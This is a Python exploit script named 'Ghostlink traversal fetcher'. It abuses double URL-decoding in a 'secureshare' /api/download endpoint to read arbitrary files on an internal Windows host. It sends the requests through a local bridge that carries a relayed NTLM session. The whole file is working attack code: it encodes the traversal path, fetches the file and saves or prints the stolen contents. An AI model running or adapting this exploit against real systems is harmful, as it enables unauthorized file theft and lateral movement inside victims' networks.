#!/usr/bin/env python3
"""Ghostlink traversal fetcher.

Abuses the double URL-decoding in the secureshare /api/download endpoint to
read arbitrary files on the internal host as svc_canary. The request is sent
through the local relay bridge (127.0.0.1:18080) which transparently carries
the relayed NTLM session.

Usage: python3 traversal_fetch.py <windows-path> [outfile]
"""
import sys
import urllib.parse
import urllib.request

BRIDGE = "http://127.0.0.1:18080"


def double_encode(raw_path: str) -> str:
    """URL-encode every character twice so the server's two decode passes
    collapse it back to the original traversal string."""
    once = "".join("%{:02x}".format(ord(ch)) for ch in raw_path)
    return "".join("%{:02x}".format(ord(ch)) for ch in once)


def fetch(raw_path: str):
    payload = double_encode(raw_path)
    url = BRIDGE + "/api/download/" + payload
    req = urllib.request.Request(url, method="GET")
    with urllib.request.urlopen(req, timeout=60) as resp:
        return resp.status, resp.read()


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)
    target = sys.argv[1]
    status, data = fetch(target)
    out = sys.argv[2] if len(sys.argv) > 2 else None
    if out:
        with open(out, "wb") as fh:
            fh.write(data)
        print(f"[+] {target} -> HTTP {status}, {len(data)} bytes -> {out}")
    else:
        print(f"[+] {target} -> HTTP {status}, {len(data)} bytes")
        print(data[:2000].decode("latin-1", errors="replace"))
